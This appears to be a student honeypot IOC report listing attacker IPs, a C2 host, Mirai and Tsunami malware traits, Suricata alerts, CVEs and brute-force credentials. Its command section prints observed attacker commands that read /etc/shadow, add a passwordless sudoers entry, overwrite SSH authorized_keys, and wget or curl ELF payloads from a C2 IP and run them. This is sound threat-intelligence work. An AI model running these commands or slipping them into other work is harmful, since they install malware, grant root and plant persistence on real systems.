# 🔴 Indicators of Compromise (IOC) Report

**Source:** T-Pot Honeypot Deployment — Cowrie & Suricata logs
**Observation Period:** ~2 months (continuous internet exposure)
**Environment:** DigitalOcean Ubuntu 22.04 — T-Pot multi-honeypot

> ⚠️ Disclaimer: All IOCs listed here were captured in a controlled honeypot research environment. This information is shared for educational and threat intelligence purposes only.

---

## 1. Malicious IP Addresses

### High-Confidence Threat Actors (Fraud Score 99/100)

| IP Address | Location | ASN | Classification | Fraud Score |
|---|---|---|---|---|
| 2.57.121.61 | Romania / UK (Data Centre) | AS47890 — Unmanaged Ltd | Scanner / Brute Force / Apache / VoIP attacker | 99/100 |
| 77.83.240.70 | Romania / UK (Data Centre) | AS47890 — Unmanaged Ltd | Scanner / Brute Force / Apache / VoIP attacker | 99/100 |
| 185.243.96.105 | Ukraine (Data Centre) | Rices Enterprise / Demenin B.V. | SSH Scanner / Spam | 99/100 |

### Top ASNs by Attack Volume

| ASN | Provider | Attack Count |
|---|---|---|
| AS47890 | Unmanaged Ltd | 310,165 |
| AS14061 | DigitalOcean | High volume |
| AS396982 | Google Cloud | High volume |
| AS8075 | Microsoft Azure | High volume |
| AS49870 | Aisycon B.V. | Notable |
| AS8560 | IONOS SE | Notable |

---

## 2. Malicious URLs / C2 Infrastructure

| URL | Purpose | File Type (Actual) |
|---|---|---|
| http://47.105.158.116/ns1.jpg | SSH authorized_keys replacement + ELF malware | Linux ELF binary (disguised as .jpg) |
| http://47.105.158.116/ns3.jpg | ELF malware binary | Linux ELF binary (disguised as .jpg) |
| http://47.105.158.116/oto | Additional payload (DDoS module / persistence) | Unknown ELF binary |

C2 IP: 47.105.158.116

---

## 3. Commands Executed by Attacker

Reconnaissance:

uname -a
id
cat /etc/passwd
cat /etc/shadow
lscpu
df -h

Privilege Escalation:

echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
chsh -s /bin/sh daemon
echo Password123 | passwd daemon --stdin

Persistence:

mkdir ~/.ssh
chattr -ia ~/.ssh/* ~/.ssh
wget http://47.105.158.116/ns1.jpg -O ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
mkdir /sbin/.ssh
cp ~/.ssh/authorized_keys /sbin/.ssh

Malware Delivery:

wget http://47.105.158.116/ns1.jpg -O /tmp/x
wget http://47.105.158.116/ns3.jpg -O /tmp/x
chmod +x /tmp/x
/tmp/x
mv /tmp/x /tmp/o
/tmp/o
rm -f /tmp/o
wget http://47.105.158.116/oto -O /etc/oto
curl http://47.105.158.116/oto -o /tmp/oto
chmod 755 /tmp/oto
/tmp/oto

---

## 4. Malware Families Identified

### Mirai (IoT Botnet)

| Attribute | Detail |
|---|---|
| Primary Function | IoT botnet + DDoS |
| C2 Method | Hardcoded IPs and ports |
| Infection Method | Brute force then payload drop |
| Architecture | ARM, MIPS, x86, PowerPC |
| Persistence | Usually none |

Static Indicators:
- File Type: ELF 32-bit, statically linked
- Common strings: /bin/busybox, wget, curl, Mirai signature functions

### Tsunami (DDoS Botnet + Backdoor)

| Attribute | Detail |
|---|---|
| Primary Function | Remote shell + DDoS |
| C2 Method | IRC-based Command and Control |
| Infection Method | Manual deployment via SSH session |
| Architecture | Mostly Linux |
| Persistence | None by default |

Behavioural Indicators:
- IRC communication to C2
- UDP/TCP flood DDoS routines
- Remote command execution

### Backdoor:Linux (Generic ELF RAT)

| Attribute | Detail |
|---|---|
| Primary Function | Remote Access Trojan |
| C2 Method | TCP-based |
| Infection Method | Manual or automated |
| Persistence | Often yes |

---

## 5. Network Indicators

| Indicator | Type | Detail |
|---|---|---|
| Port 22 | Targeted Service | SSH — primary brute-force target |
| Port 5060 | Targeted Service | SIP/VoIP — highest attack volume |
| Port 23 | Targeted Service | Telnet — Mirai propagation |
| Port 445 | Targeted Service | SMB |
| Port 80 | Targeted Service | HTTP |
| IRC ports | C2 Traffic | Tsunami C2 communication |

---

## 6. CVEs Detected via Suricata

| CVE | CVSS Score | Description | Affected Systems |
|---|---|---|---|
| CVE-2020-11900 | Moderate | Treck TCP/IP stack IPv4 tunnelling double-free vulnerability | IoT / Embedded devices (Treck < 6.0.1.41) |
| CVE-2020-11910 | 9.8 Critical | CWE-125 Out-of-bounds Read in Treck TCP/IP stack | IoT / Embedded devices |

---

## 7. Suricata Alert Signatures Triggered

| Signature ID | Name | Meaning |
|---|---|---|
| 2210051 | SURICATA STREAM Packet with broken ACK | Malformed TCP packet — likely network scanning / evasion |
| 2210037 | SURICATA STREAM FIN recv but no session | FIN packet with no session — nmap-style port scanning |
| 2228000 | SURICATA SSH invalid banner | Malformed SSH banner — brute-force / SSH fingerprinting |

---

## 8. Brute Force Credentials Observed

root / admin
root / password
root / 123456
admin / admin123
admin / password
admin / admin
root / root

---

> All IOCs captured in a controlled honeypot research environment for educational and threat intelligence purposes.
> Part of MSc Applied Cybersecurity research — Technological University Dublin.
